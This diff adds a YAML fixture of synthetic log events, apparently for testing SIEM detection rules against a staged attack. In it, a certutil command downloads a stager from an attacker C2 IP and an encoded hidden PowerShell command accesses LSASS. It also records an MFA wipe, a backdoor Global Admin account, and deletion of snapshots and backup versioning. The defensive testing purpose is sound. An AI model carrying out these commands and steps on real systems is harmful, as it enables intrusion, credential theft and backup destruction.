@@ -1,0 +1,220 @@
+events:
+
+  # ─────────────────────────────────────────────────────────────
+  #  STAGE 1 — SentinelOne.DeepVisibilityV2
+  #  Flat dot-notation keys — Cloud Funnel 2.0 format
+  #  event.time: 0 → prepare_payload injects current timestamp
+  # ─────────────────────────────────────────────────────────────
+
+  - description: "Certutil LOLBin downloading payload from attacker C2"
+    malicious: true
+    scenario: killchain_stage_1
+    expected_detection: XYZCompany.SentinelOne.LOLBin.CredentialAccess
+    event:
+      p_log_type: SentinelOne.DeepVisibilityV2
+      account.id: xyzcompany-s1-account-01
+      event.time: 0
+      event.type: ProcessCreation
+      event.category: process
+      src.process.name: certutil.exe
+      src.process.cmdline: "certutil.exe -urlcache -split -f http://185.220.101.47/tools/stager.exe C:\\Windows\\Temp\\svhost32.exe"
+      src.process.image.path: "C:\\Windows\\System32\\certutil.exe"
+      src.process.image.sha256: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2
+      src.process.user: "XYZCO\\jsmith"
+      src.process.pid: 4812
+      src.process.parent.name: cmd.exe
+      src.process.parent.image.path: "C:\\Windows\\System32\\cmd.exe"
+      src.process.parent.pid: 3104
+      src.process.storyline.id: BEAZLEY-KC-2026
+      tgt.process.name: ""
+      endpoint.name: WKSTN-XYZ-042
+      endpoint.os: windows
+      agent.uuid: s1-agent-xyzcompany-042
+      site.name: corp.xyzcompany.com
+
+  - description: "Encoded PowerShell + LSASS memory access (credential dump)"
+    malicious: true
+    scenario: killchain_stage_1
+    expected_detection: XYZCompany.SentinelOne.LOLBin.CredentialAccess
+    event:
+      p_log_type: SentinelOne.DeepVisibilityV2
+      account.id: xyzcompany-s1-account-01
+      event.time: 0
+      event.type: Open Remote Process Handle
+      event.category: cross_process
+      src.process.name: powershell.exe
+      src.process.cmdline: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+      src.process.image.path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      src.process.image.sha256: b94f4b2c1d3e5678901234567890abcdef1234567890abcdef1234567890abce
+      src.process.user: "XYZCO\\jsmith"
+      src.process.pid: 6220
+      src.process.parent.name: svhost32.exe
+      src.process.parent.image.path: "C:\\Windows\\Temp\\svhost32.exe"
+      src.process.parent.pid: 5100
+      src.process.storyline.id: BEAZLEY-KC-2026
+      tgt.process.name: lsass.exe
+      tgt.process.pid: 688
+      tgt.process.image.path: "C:\\Windows\\System32\\lsass.exe"
+      endpoint.name: WKSTN-XYZ-042
+      endpoint.os: windows
+      agent.uuid: s1-agent-xyzcompany-042
+      site.name: corp.xyzcompany.com
+
+  # ─────────────────────────────────────────────────────────────
+  #  STAGE 2 — Azure.Audit (Entra ID)
+  #  properties nested per Azure.Audit schema
+  #  activityDateTime injected by prepare_payload
+  # ─────────────────────────────────────────────────────────────
+
+  - description: "MFA reset on user account (attacker using stolen admin creds)"
+    malicious: true
+    scenario: killchain_stage_2
+    expected_detection: XYZCompany.EntraID.BulkMFAReset.AdminRoleAdded
+    event:
+      p_log_type: Azure.Audit
+      operationName: Update user
+      category: AuditLogs
+      Level: Informational
+      callerIpAddress: 185.220.101.47
+      correlationId: entra-corr-beazley-001
+      properties:
+        activityDisplayName: Update user
+        result: success
+        category: UserManagement
+        initiatedBy:
+          user:
+            id: aad-user-001
+            displayName: James Smith
+            userPrincipalName: jsmith@corp.xyzcompany.com
+            ipAddress: 185.220.101.47
+        targetResources:
+          - id: aad-user-002
+            userPrincipalName: alee@corp.xyzcompany.com
+            displayName: Alice Lee
+            type: User
+            modifiedProperties:
+              - displayName: StrongAuthenticationMethods
+                oldValue: '[{"MethodType":"PhoneAppNotification","Default":true}]'
+                newValue: "[]"
+
+  - description: "Backdoor account added to Global Administrator role"
+    malicious: true
+    scenario: killchain_stage_2
+    expected_detection: XYZCompany.EntraID.BulkMFAReset.AdminRoleAdded
+    event:
+      p_log_type: Azure.Audit
+      operationName: Add member to role
+      category: AuditLogs
+      Level: Informational
+      callerIpAddress: 185.220.101.47
+      correlationId: entra-corr-beazley-002
+      properties:
+        activityDisplayName: Add member to role
+        result: success
+        category: RoleManagement
+        initiatedBy:
+          user:
+            id: aad-user-001
+            displayName: James Smith
+            userPrincipalName: jsmith@corp.xyzcompany.com
+            ipAddress: 185.220.101.47
+        targetResources:
+          - id: aad-user-backdoor
+            userPrincipalName: svc.sync@corp.xyzcompany.com
+            displayName: Service Sync Account
+            type: User
+            modifiedProperties: []
+          - id: 62e90394-69f5-4237-9190-012177145e10
+            displayName: Global Administrator
+            type: Role
+            modifiedProperties: []
+
+  # ─────────────────────────────────────────────────────────────
+  #  STAGE 3 — AWS.CloudTrail
+  #  eventTime injected by prepare_payload
+  # ─────────────────────────────────────────────────────────────
+
+  - description: "AssumeRole from attacker IP using stolen cloud credentials"
+    malicious: false
+    scenario: killchain_stage_3
+    expected_detection: ""
+    event:
+      p_log_type: AWS.CloudTrail
+      eventName: AssumeRole
+      eventSource: sts.amazonaws.com
+      eventVersion: "1.08"
+      eventType: AwsApiCall
+      awsRegion: us-east-1
+      sourceIPAddress: 185.220.101.47
+      userAgent: "aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0"
+      requestParameters:
+        roleArn: arn:aws:iam::123456789012:role/EngineeringAdmin
+        roleSessionName: session-1
+        durationSeconds: 3600
+      userIdentity:
+        type: IAMUser
+        principalId: AIDAEXAMPLEID
+        arn: arn:aws:iam::123456789012:user/svc-deploy
+        accountId: "123456789012"
+        userName: svc-deploy
+
+  - description: "EC2 snapshot deletion - backup destruction pre-ransomware"
+    malicious: true
+    scenario: killchain_stage_3
+    expected_detection: XYZCompany.AWS.BackupDestruction.SnapshotDeleteVersioningDisable
+    event:
+      p_log_type: AWS.CloudTrail
+      eventName: DeleteSnapshot
+      eventSource: ec2.amazonaws.com
+      eventVersion: "1.08"
+      eventType: AwsApiCall
+      awsRegion: us-east-1
+      sourceIPAddress: 185.220.101.47
+      userAgent: "aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0"
+      requestParameters:
+        snapshotId: snap-0a1b2c3d4e5f67890
+      responseElements:
+        return: true
+      userIdentity:
+        type: AssumedRole
+        principalId: "AROAEXAMPLEID:session-1"
+        arn: arn:aws:sts::123456789012:assumed-role/EngineeringAdmin/session-1
+        accountId: "123456789012"
+        sessionContext:
+          sessionIssuer:
+            type: Role
+            arn: arn:aws:iam::123456789012:role/EngineeringAdmin
+            userName: EngineeringAdmin
+          attributes:
+            mfaAuthenticated: "false"
+
+  - description: "S3 versioning suspended on prod backup bucket"
+    malicious: true
+    scenario: killchain_stage_3
+    expected_detection: XYZCompany.AWS.BackupDestruction.SnapshotDeleteVersioningDisable
+    event:
+      p_log_type: AWS.CloudTrail
+      eventName: PutBucketVersioning
+      eventSource: s3.amazonaws.com
+      eventVersion: "1.08"
+      eventType: AwsApiCall
+      awsRegion: us-east-1
+      sourceIPAddress: 185.220.101.47
+      userAgent: "aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0"
+      requestParameters:
+        bucketName: corp-backups-prod
+        VersioningConfiguration:
+          Status: Suspended
+      responseElements: null
+      userIdentity:
+        type: AssumedRole
+        principalId: "AROAEXAMPLEID:session-1"
+        arn: arn:aws:sts::123456789012:assumed-role/EngineeringAdmin/session-1
+        accountId: "123456789012"
+        sessionContext:
+          sessionIssuer:
+            type: Role
+            arn: arn:aws:iam::123456789012:role/EngineeringAdmin
+            userName: EngineeringAdmin
+          attributes:
+            mfaAuthenticated: "false"
